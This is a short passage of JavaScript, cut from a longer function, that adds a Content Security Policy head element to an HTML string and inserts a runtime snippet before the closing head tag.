      html = html.slice(0, at) + `<head>${csp}</head>` + html.slice(at);
    } else {
      html = `<head>${csp}</head>` + html;
    }
  }
  const headClose = html.search(/<\/head\s*>/i);
  if (headClose !== -1) {
    html = html.slice(0, headClose) + runtime + html.slice(headClose);
  } else {
    html += runtime;
  }
  return html;
}
